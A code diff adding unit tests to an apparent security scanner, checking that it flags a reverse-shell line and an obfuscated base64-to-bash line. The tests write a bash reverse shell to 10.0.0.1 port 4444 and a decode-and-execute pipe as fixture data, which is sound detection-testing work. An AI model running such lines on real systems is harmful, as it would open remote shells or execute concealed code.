@@ -54,6 +54,22 @@ class ScanFileTests(unittest.TestCase):
 
         self.assertEqual(scan.line_number(text, text.index("third")), 3)
 
+    def test_scan_file_detects_reverse_shell(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "payload.sh"
+            path.write_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", encoding="utf-8")
+            findings = scan.scan_file(path, min_severity="high")
+        self.assertEqual([f.rule_id for f in findings], ["reverse-shell"])
+        self.assertEqual(findings[0].severity, "critical")
+
+    def test_scan_file_detects_obfuscated_exec(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "run.sh"
+            path.write_text("echo Y2F0 | base64 -d | bash\n", encoding="utf-8")
+            findings = scan.scan_file(path, min_severity="high")
+        self.assertEqual([f.rule_id for f in findings], ["obfuscated-exec"])
+        self.assertEqual(findings[0].severity, "high")
+
 
 class FileIterationTests(unittest.TestCase):
     def test_missing_roots_reports_absent_scan_roots(self) -> None:
@@ -114,6 +130,9 @@ class ContextClassificationTests(unittest.TestCase):
             "skills/demo/CHANGELOG": "docs",
             "skills/demo/tests/test_it.py": "example",
             "skills/demo/examples/walkthrough.md": "example",
+            "skills/demo/src/audit.test.ts": "example",
+            "skills/demo/src/audit.spec.js": "example",
+            "skills/demo/src/audit.ts": "script",
             "skills/demo/data.json": "other",
         }
         for path, expected in cases.items():
